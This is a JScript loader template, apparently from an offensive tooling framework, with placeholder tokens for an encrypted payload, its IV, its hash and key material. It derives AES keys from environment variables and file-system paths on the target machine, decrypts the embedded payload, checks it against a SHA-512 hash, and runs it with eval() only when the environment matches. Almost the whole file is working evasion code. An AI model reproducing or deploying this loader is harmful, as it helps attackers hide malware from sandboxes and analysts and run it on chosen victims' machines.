function decryptAES(decryptMe, key) { 
    var aes = new ActiveXObject("System.Security.Cryptography.RijndaelManaged");
    var a = new ActiveXObject("System.Text.ASCIIEncoding");
    aes.Mode = 1; //CBC
    aes.Padding = 2; //PKCS7
    aes.BlockSize = 128;
    aes.KeySize = 256;
    aes.IV = decodeBase64("~AESIVBASE64~");
    aes.Key = a.GetBytes_4(key);

    var encBytes = decodeBase64(decryptMe);
    var encLen = (a.GetByteCount_2(decryptMe) / 4) * 3;
    encLen = encLen - (decryptMe.split("=").length - 1)

    var decrypted = aes.CreateDecryptor().TransformFinalBlock(encBytes,0,encLen);
    return a.GetString(decrypted);
}
function decodeBase64(base64) {
    var dm = new ActiveXObject("Microsoft.XMLDOM");
    var el = dm.createElement("tmp");
    el.dataType = "bin.base64";
    el.text = base64
    return el.nodeTypedValue
}
function binToHex(binary) {
    var dom = new ActiveXObject("Microsoft.XMLDOM");
    dom.loadXML("<W00t/>");
    dom.documentElement.dataType = "bin.hex";
    dom.documentElement.nodeTypedValue = binary;
    dom.documentElement.removeAttribute("dt:dt");
    return dom.documentElement.nodeTypedValue;
}
function getSHA512(bytes) {
    var sha512 = new ActiveXObject("System.Security.Cryptography.SHA512Managed");
    var text = new ActiveXObject("System.Text.ASCIIEncoding");
    var result = binToHex(sha512.ComputeHash_2((text.GetBytes_4(bytes))));
    return result
}
function compareHash(decrypted, hash) {
    var sha512 = new ActiveXObject("System.Security.Cryptography.SHA512Managed");
    var text = new ActiveXObject("System.Text.ASCIIEncoding");
    var newHash = getSHA512(decrypted);
    if(newHash == hash) {
        return true;
    }
    else {
        return false;
    }
}
function tryKeyCombos(combos, path, encrypted, payloadHash) {
    for(k = 0; k < combos.length; k++) {
        var key = combos[k].toLowerCase() + path.toLowerCase();

        key = getSHA512(key);
        key = key.substring(0,32);
        try {
            var decrypted = decryptAES(encrypted, key)
            if(compareHash(decrypted, payloadHash)) {
                eval(decrypted);
                WScript.Quit(1);
            }
        }
        catch(err) {}
    }
    return ""
}

var allPaths = [], envCombos = [];
allPaths.push("");
envCombos.push("");

~WALKOS~
~ENVVAR~

for(i = 0; i < allPaths.length; i++) {
    tryKeyCombos(envCombos, allPaths[i], "~ENCRYPTEDBASE64~", "~PAYLOADHASH~")
}